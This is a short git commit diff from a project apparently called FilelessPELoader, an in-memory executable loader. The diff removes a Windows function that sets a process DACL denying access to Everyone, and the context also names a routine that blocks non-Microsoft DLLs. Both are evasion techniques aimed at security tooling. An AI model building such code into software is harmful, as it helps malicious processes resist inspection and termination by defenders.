0103ec09f227181ce9a4d79a87e8feab806767aa
skhalidl01 <100454730+skhalidl01@users.noreply.github.com>
2023-05-19 22:49:34 +0200

    Update Block.cpp

--- FilelessPELoader/Block.cpp
+++ FilelessPELoader/Block.cpp
@@ -19,27 +19,3 @@ BOOL BlockNonMSDlls() {
 }
 
 
-void SetProcessSecurityDescriptor() {
-    // Define a security descriptor string in SDDL format
-    // The following SDDL string denies all access to the process, except for the SYSTEM account and the process owner
-    LPCWSTR sddl = L"D:P"
-        L"(D;OICI;GA;;;WD)"  // Deny all access to the "World" (Everyone)
-        L"(A;OICI;GA;;;SY)"  // Allow all access to the "System"
-        L"(A;OICI;GA;;;OW)"; // Allow all access to the process "Owner"
-
-    PSECURITY_DESCRIPTOR securityDescriptor = nullptr;
-
-    // Convert the SDDL string to a security descriptor
-    if (!ConvertStringSecurityDescriptorToSecurityDescriptorW(sddl, SDDL_REVISION_1, &securityDescriptor, nullptr)) {
-        // Handle the error
-        return;
-    }
-
-    // Set the security descriptor for the process
-    if (!SetKernelObjectSecurity(GetCurrentProcess(), DACL_SECURITY_INFORMATION, securityDescriptor)) {
-        // Handle the error
-    }
-
-    // Free the security descriptor
-    LocalFree(securityDescriptor);
-}
